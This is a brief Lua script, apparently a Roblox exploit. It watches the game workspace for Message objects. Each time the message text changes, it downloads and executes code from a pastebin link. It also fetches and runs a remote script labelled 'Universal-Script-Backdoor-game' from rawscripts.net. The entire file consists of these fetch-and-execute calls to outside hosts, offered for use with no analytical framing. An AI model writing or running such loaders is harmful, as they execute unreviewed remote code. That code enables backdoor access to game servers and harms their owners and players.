local lastMessageText = nil

while task.wait(1) do
    local message = workspace:FindFirstChildOfClass("Message")
    if message and message:IsA("Message") then
        if message.Text ~= lastMessageText then
            lastMessageText = message.Text

            -- This willpop
            loadstring(game:HttpGet("https://pastebin.com/raw/QfJn3J9A"))()
        end
    end
end

loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Backdoor-game-15740"))()
